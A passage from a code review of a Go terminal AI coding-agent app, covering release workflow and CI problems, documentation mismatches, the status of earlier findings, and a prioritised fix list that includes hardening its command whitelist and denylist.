- **High: the release workflow strips and cross-compiles Windows binaries.** `release.yml:28,39` runs every target on `ubuntu-latest` with `-ldflags "-s -w ..."`.
  - The published v0.4.4-dev1 `.exe` shows `-s -w` and `CGO_ENABLED=0`.
  - This contradicts the CHANGELOG (lines 54 and 69), the archived `windows-defender.md`, CLAUDE.md and README.
  - Only `gohome-ci.yml` builds Windows natively, and its artifacts are not released.
- **Action versions are behind:**

  | Action | Used | Latest |
  |---|---|---|
  | checkout | v4 | v7.0.1 |
  | setup-go | v5 | v7.0.0 |
  | upload-artifact | v4 | v7.0.2 |
  | download-artifact | v4 | v8.0.2 |
  | golangci-lint-action | v7 | v9.3.0 |

- **golangci-lint version is not pinned.** CI uses v2.15.0; local is 2.12.2.
- **No-op linter config:** `disable: [funlen, gochecknoinits]` does nothing in the v2 standard set.
- **Version flag:** no CI build sets `-X main.version`.
- **Release notes:** the whole CHANGELOG is used as release notes.
- **Size guard:** the 25 MB guard covers linux/amd64 only. `release.yml` has none.

### LLM APIs
- See L1 (thinking), L4 (retries), L8 (OpenAI `max_tokens`) and L9 (no prompt caching).

---

## 9. Documentation mismatches

### README.md
- Says Shift+Enter inserts a newline. It is Alt+Enter (`model_keys.go:104`, `editor.go:438`). Bubble Tea v1 cannot detect Shift+Enter.
- Says `/resume <id>` resumes by ID. It opens the browser with a filter (`model_slash.go:131`).
- Says `/new` and `/resume` are "not configured until wired". They are wired (`main.go:625-694`).
- `/config`: the "press `e`" instruction is wrong. It is a select list (`config_overlay.go:26-30`).
- Says the compaction prefix is `COMPACT:`. It is `[Auto-compact summary]` (`session/events.go:68`).
- `retryBackoffMs` is documented but has no effect (L7). Fixed on branch `fix/llm-wire-configs`.
- The `contextWindow` default is shown as "—" and "display only". It is 128000 and drives compaction.
- Says deny "returns an error to the agent". A plain deny ends the run. The model sees the denial only on the next user message (`run.go:179,236`).
- The denylist, its file locations, and the fact that it applies in yolo mode are not documented. The whitelist file format is not documented either, although CLAUDE.md points to it.
- Not documented:
  - Sudo fails in yolo mode.
  - Esc cancels an in-flight turn.
  - `d d` deletes a session in the browser.
  - The `/help` command.
- `--prompt -` is said to require `--verbose`. It also requires `--yolo` (`main.go:210`).

### In-app help (help.go)
- Lists `c` for copy. It is Ctrl+Y.
- Lists `/endpoint` and `--endpoint`. Neither exists.
- Missing: Ctrl+D, Ctrl+Y, `/clear-queue`, `/mouse`, `/config`, approval `v`/`e`, `--config`, `--prompt`, `--verbose`.

### CLAUDE.md
- Lists a "session" tool. `tools/session.go` is a context helper. The tools are shell, read, write, edit and subagent.
- The Frontend interface also requires `SteerCh()` (`agent/events.go:65-70`).
- Says "the CI workflow builds without strip flags" but does not say that `release.yml` strips.

### CHANGELOG.md
- There is no "Unreleased" section for #47.
- The v0.3.0 and v0.3.1 sections were removed on purpose in commit 0b66e05.

### gohome/FUTURE.md
- "Out of v0.2 scope" is an outdated framing.
- Mouse support is half shipped: wheel scrolling yes, click-to-focus no.
- The queued-messages item is fixed.

---

## 10. Status of earlier items

Sources:
- GOAL.md
- TODO
- The 2026-08-21 goal review (archived)
- The 2026-09-15 code review (archived)

| Item | Status | Notes |
|---|---|---|
| Mid-turn steering (GOAL 1, TODO) | Mostly fixed | `SteerCh` is polled between tools and after the turn. It is not checked before the first tool, so a steer typed during streaming lands after the first tool runs. |
| Mouse breaks text selection (GOAL 2, TODO) | Workaround | `/mouse` toggle, idle timeout, Shift hint |
| Render slowdown at 40k+ (GOAL 3, TODO) | Partly fixed | P1-P4 and L2 fixed in #43. P5, P6, P7 and P8 are open. |
| Compaction breaks the cache (GOAL 4, TODO) | Partly fixed | Stable 2-message prefix, but no `cache_control`. A resumed session has a different message shape (D6). |
| Long approval not scrollable (GOAL 5, TODO) | Partly fixed | `v` expands, but the top is cut off when taller than the terminal (A8). |
| Queued messages fire separately (GOAL 6, TODO) | Fixed | Combined (`model_agent.go:178`). Ctrl+D and `/clear-queue` exist. New routing bugs: A4. |
| Auto-scroll re-enable at bottom (TODO) | Partly fixed | Wheel and PgDown work. Arrow Down does not (A7). |
| Windows multi-line paste (TODO) | Open | R5 |
| Sudo password testing (TODO) | Implemented (#45, #47) | Manual test status unknown. See S4, A9. |
| H1 steer in multi-tool turn | Fixed | Saved to JSONL since D3 |
| H2-H6 | Fixed | |
| M1 whitelist prefix-only | Open | S1 |
| M2 empty Allow-always pattern | Open | S3 |
| M3 shell timeout with grandchild | Open | H2 |
| M4 sudo + whitelist | Fixed | Now leads to S4. |
| M5 sudo detection and stdin | Mostly fixed | Password moved to fd 3. Remaining misses: A9. |
| M6 invalid tool JSON | Fixed | D4 |
| M7 `/model` race and defaults | Open | A5 |
| M8 resume keeps old model | Open | A6 |
| M9 wizard cancel, nil client | Open | H5 |
| M10 wizard overwrites settings | Fixed | L7 |
| M11 cache tokens in compaction | Fixed | L9 |
| M12 no HTTP timeouts | Fixed | L4 |
| M13 headless Ctrl+C on stdin | Open | A10 |
| M14 429/408 not retried | Fixed | L4 |
| M15 Emit after Close | Fixed | D9 |
| L1 tool arg keys | Open | R15 |
| L2 render throttle default | Fixed | |
| L3 raw path compare | Open | T3 |
| L4 EDITOR with arguments | Open | `model_keys.go:347`, `config_editor.go:27` |
| L5 delete active session | Open | R19 |
| L6 stale approval after cancel | Open, worse | A2 |
| L7 byte-wise backspace | Open | R16 |
| L8 Ctrl+E shadowed | Open | R18 |
| L9 redacted_thinking | Fixed | L3 |
| L10 resume by StartedAt, full scan | Open | D1, D2 |
| L11 headless final text | Open, worse | A10 |
| L12 doc mismatches | Partly fixed | Section 9 |
| L13 denylist best-effort | Open | S7 |
| L14 minor edge cases | Open | R8, T1, T3 |
| Perf 5-11 (performance-findings.md) | Open | `textBuf +=` (`turn.go:65`), `Schemas()` rebuilt every turn, no file-search debounce, no bufio in the session writer |

---

## 11. Suggested priority

1. **Guard and project trust (S1-S4):**
   - Add an end anchor or shell-operator check for whitelist matches.
   - Escape suggestions and reject empty patterns.
   - Never suggest `^sudo`.
   - Require explicit trust before loading project whitelist, settings and denylist files, or ignore security-relevant keys from project files.
2. **Shell tool (H1, H2, T1):** kill the process group with a `WaitDelay`, drain the pipe on scanner error, and cap output size.
3. **Session integrity (D1-D4, D6):**
   - Raise the scanner buffer.
   - Use unique subagent IDs and skip children when listing.
   - Save skipped tool results.
   - Validate tool JSON and act on the stop reason.
   - Group replayed tool results.
4. **Surfacing errors and cancel (A1, A2, H5):** emit `EventError` for stream errors, check ctx between tools, clear approvals on cancel, and handle a nil client.
5. **Rendering safety (H3, H4, S5):** clamp widths and strip control sequences from untrusted text.
6. **LLM wire (L1, L4, L6):** make thinking optional and support adaptive mode, retry 429/408 with `Retry-After`, add stream timeouts, and fix the skeleton placeholders.
7. **Toolchain and release:** move to Go 1.26.9 or later, and build Windows release binaries natively without `-s -w`.
8. **Docs:** fix the README, `help.go` and CLAUDE.md items in section 9.
